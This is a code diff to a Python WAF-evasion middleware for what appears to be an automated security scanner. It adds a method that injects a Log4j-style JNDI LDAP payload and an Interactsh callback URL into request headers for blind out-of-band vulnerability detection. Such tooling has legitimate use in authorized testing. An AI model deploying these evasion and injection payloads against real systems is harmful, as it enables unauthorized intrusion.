@@ -7,6 +7,7 @@ class WAFEvasionMiddleware:
 
     This middleware intercepts failed requests (403/406) and attempts to retry them
     using semantic equivalent payloads to bypass WAFs.
+    Also handles OOB payload injection.
     """
 
     def __init__(self):
@@ -15,6 +16,7 @@ class WAFEvasionMiddleware:
             "blocked_keywords": set(),
             "successful_techniques": []
         }
+        self.interactsh_domain = "oob.interactsh.com" # Placeholder, real agent would fetch this
 
     def process_response(self, request: Dict[str, Any], response: Dict[str, Any]) -> Optional[Dict[str, Any]]:
         """
@@ -33,6 +35,28 @@ class WAFEvasionMiddleware:
             return self._generate_evasion_mutation(request)
 
         return None
+
+    def inject_oob_payloads(self, request: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Injects OOB (Interactsh) payloads into headers for blind vulnerability detection.
+        """
+        if not self.interactsh_domain:
+            return request
+
+        modified = request.copy()
+        headers = modified.get("headers", {}).copy()
+
+        payload = f"${{jndi:ldap://{self.interactsh_domain}/a}}" # Log4j style
+        payload_simple = f"http://{self.interactsh_domain}/"
+
+        # Inject into standard tracking headers
+        headers["X-Forwarded-For"] = payload_simple
+        headers["Referer"] = headers.get("Referer", "") + payload_simple
+        headers["User-Agent"] = headers.get("User-Agent", "") + " " + payload_simple
+        headers["X-Api-Version"] = payload_simple
+
+        modified["headers"] = headers
+        return modified
 
     def _generate_evasion_mutation(self, request: Dict[str, Any]) -> Optional[Dict[str, Any]]:
         """
